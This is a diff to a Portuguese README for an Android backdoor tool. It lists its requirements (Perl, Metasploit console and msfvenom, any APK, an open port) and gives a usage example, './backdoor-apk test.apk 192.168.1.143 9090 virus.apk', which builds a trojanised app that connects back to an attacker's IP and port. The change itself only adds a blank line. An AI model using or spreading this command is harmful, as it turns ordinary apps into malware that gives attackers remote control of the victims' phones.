@@ -6,6 +6,7 @@ Necessário o Perl, MSF(console e venom), um APK(qualquer) e porta aberta, é cl
 Para adcionar o Backdoor ao APK use por exemplo:
 
 IP:
+
 ./backdoor-apk test.apk 192.168.1.143 9090 virus.apk
 
 Host/DDNS:
